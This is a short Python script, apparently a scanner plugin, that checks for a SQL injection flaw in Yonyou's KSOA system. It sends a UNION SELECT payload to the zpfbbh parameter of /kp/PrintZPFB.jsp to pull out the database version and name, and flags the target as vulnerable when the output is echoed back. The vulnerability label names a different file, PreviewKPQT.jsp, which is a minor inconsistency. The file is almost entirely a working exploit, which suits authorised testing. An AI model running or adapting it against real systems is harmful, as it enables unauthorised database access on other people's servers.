import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友时空KSOA系统接口PreviewKPQT.jsp存在SQL注入漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
    }
    vurl = urllib.parse.urljoin(url, "/kp/PrintZPFB.jsp?zpfbbh=1%27+union+select+1,2,3,@@VERSION,db_name()+--+")
    try:
        response = requests.get(vurl, headers=headers)
        if response.status_code == 200 and ('1,2' in response.text or 'Microsoft' in response.text):
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult